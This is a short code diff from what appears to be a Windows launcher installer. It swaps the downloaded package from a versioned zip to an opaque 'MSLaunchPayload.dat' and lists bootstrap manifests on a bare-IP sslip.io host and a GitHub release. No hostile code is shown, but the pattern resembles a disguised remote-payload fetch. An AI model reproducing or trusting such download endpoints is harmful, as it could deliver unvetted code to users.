@@ -22,8 +22,8 @@ USER_CONFIG_PATH = Path(os.environ.get("APPDATA", Path.home() / "AppData" / "Roa
 DESKTOP = Path(os.environ.get("USERPROFILE", str(Path.home()))) / "Desktop"
 SHORTCUT_PATH = DESKTOP / "MSLaunch.lnk"
 EXE_NAME = "MSLauncher.exe"
-PACKAGE_NAME = "MSLaunch-1.9.0-beta.zip"
-PACKAGE_SHA256 = "885a99ecb8fa8c6e29ed071ddb64542249dfa492476fe96318861e9f500553ab"
+PACKAGE_NAME = "MSLaunchPayload.dat"
+PACKAGE_SHA256 = "c5110a0780234de894d9a7318b43187004562e4fe698c1fcde6d0b957567e150"
 BOOTSTRAP_MANIFESTS = [
     "https://mslaunch.186.246.12.238.sslip.io/downloads/bootstrap.json",
     "https://github.com/mio-openliven/MSNukem/releases/download/v1.9.0-beta.1/bootstrap.json",
